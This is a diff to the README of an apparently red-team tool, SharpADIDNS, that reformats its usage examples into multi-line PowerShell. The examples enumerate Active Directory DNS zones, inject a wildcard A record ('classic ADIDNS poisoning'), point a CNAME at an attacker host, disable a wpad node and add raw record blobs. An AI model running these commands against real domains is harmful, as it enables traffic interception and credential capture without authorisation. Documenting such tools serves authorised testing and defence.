@@ -86,46 +86,72 @@ SharpADIDNS.exe <action> [options]
 
 ## Examples
 
+Examples are shown with PowerShell line continuation (backtick `` ` ``). In `cmd.exe`, remove the backticks and put the whole command on one line, or use `^` instead.
+
 Enumerate every node in a zone:
 
-```
-SharpADIDNS.exe enum --zone redteamnotes.local --domain-dn DC=redteamnotes,DC=local --server dc01.redteamnotes.local
+```powershell
+SharpADIDNS.exe enum `
+  --zone redteamnotes.local `
+  --domain-dn DC=redteamnotes,DC=local `
+  --server dc.redteamnotes.local
 ```
 
 Read one record and decode all blobs on it:
 
-```
-SharpADIDNS.exe query --zone redteamnotes.local --name fileserver --domain-dn DC=redteamnotes,DC=local
+```powershell
+SharpADIDNS.exe query `
+  --zone redteamnotes.local --name sccm `
+  --domain-dn DC=redteamnotes,DC=local
 ```
 
 Inject a wildcard A record (classic ADIDNS poisoning):
 
-```
-SharpADIDNS.exe add --zone redteamnotes.local --name "*" --type A --data 10.0.0.66 --domain-dn DC=redteamnotes,DC=local --ttl 600
+```powershell
+SharpADIDNS.exe add `
+  --zone redteamnotes.local --name "*" `
+  --type A --data 10.0.0.66 --ttl 600 `
+  --domain-dn DC=redteamnotes,DC=local
 ```
 
 Add an AAAA record with explicit credentials over LDAPS:
 
-```
-SharpADIDNS.exe add --zone redteamnotes.local --name web --type AAAA --data fe80::1 --domain-dn DC=redteamnotes,DC=local --server dc01.redteamnotes.local --username redteamnotes\alice --password "P@ss" --ldaps
+```powershell
+SharpADIDNS.exe add `
+  --zone redteamnotes.local --name web `
+  --type AAAA --data fe80::1 `
+  --domain-dn DC=redteamnotes,DC=local `
+  --server dc.redteamnotes.local `
+  --username redteamnotes\alice --password 'P@ss' `
+  --ldaps
 ```
 
 Add a CNAME (preserves any A/AAAA already on the node when used with `--force`):
 
-```
-SharpADIDNS.exe add --zone redteamnotes.local --name printer --type CNAME --data attacker.redteamnotes.local --domain-dn DC=redteamnotes,DC=local --force
+```powershell
+SharpADIDNS.exe add `
+  --zone redteamnotes.local --name printer `
+  --type CNAME --data attacker.redteamnotes.local `
+  --domain-dn DC=redteamnotes,DC=local `
+  --force
 ```
 
 Tombstone a node instead of hard-deleting it:
 
-```
-SharpADIDNS.exe disable --zone redteamnotes.local --name wpad --domain-dn DC=redteamnotes,DC=local
+```powershell
+SharpADIDNS.exe disable `
+  --zone redteamnotes.local --name wpad `
+  --domain-dn DC=redteamnotes,DC=local
 ```
 
 Inject a pre-built record (e.g. for non-standard types or PoC reproduction):
 
-```
-SharpADIDNS.exe add --zone redteamnotes.local --name custom --raw BASE64_DNSRECORD_BLOB --domain-dn DC=redteamnotes,DC=local --force
+```powershell
+SharpADIDNS.exe add `
+  --zone redteamnotes.local --name custom `
+  --raw BASE64_DNSRECORD_BLOB `
+  --domain-dn DC=redteamnotes,DC=local `
+  --force
 ```
 
 ## Notes
